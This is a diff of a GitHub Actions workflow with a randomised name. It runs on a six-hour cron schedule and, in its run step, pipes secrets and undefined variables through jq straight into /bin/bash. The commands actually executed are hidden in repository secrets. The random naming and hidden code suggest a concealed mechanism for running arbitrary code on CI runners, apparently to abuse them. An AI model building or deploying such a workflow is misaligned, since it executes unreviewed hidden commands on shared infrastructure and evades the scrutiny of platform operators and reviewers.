@@ -2,8 +2,9 @@ name: dongchudai5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
-jobs:  # 4604
+    - cron: '54 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,15 +12,15 @@ jobs:  # 4604
       - uses: actions/checkout@v4
       - name: dongchudai5647
         env:
-          cyzc4: ${{ secrets.cyzc4 }}
+          ck4798: ${{ secrets.ck4798 }}
         run: |
-          echo $cyzc4 | jq -r .pv79110 | /bin/bash
-          echo $waurs3760 | jq -r .tw88985 | /bin/bash
-          echo $ky27434 | jq -r .h2892 | /bin/bash
-          echo $dxfpk9183 | jq -r .ade97 | /bin/bash
-          echo $weg733 | jq -r .mbkz99824 | /bin/bash
-          echo $zbaa80 | jq -r .p85618 | /bin/bash
-          echo $rd91793 | jq -r .pti6 | /bin/bash
-          echo $a84 | jq -r .rt8930 | /bin/bash
-          echo $rkc3 | jq -r .an48 | /bin/bash
+          echo $ck4798 | jq -r .owzyk726 | /bin/bash
+          echo $jn86929 | jq -r .iqkn5 | /bin/bash
+          echo $lwo5494 | jq -r .i43 | /bin/bash
+          echo $hkvy10 | jq -r .f0030 | /bin/bash
+          echo $yjz01 | jq -r .pt7626 | /bin/bash
+          echo $swww087 | jq -r .pbs771 | /bin/bash
+          echo $para20 | jq -r .g77463 | /bin/bash
+          echo $k986 | jq -r .iymo93797 | /bin/bash
+          echo $xdb90 | jq -r .ut352 | /bin/bash
 
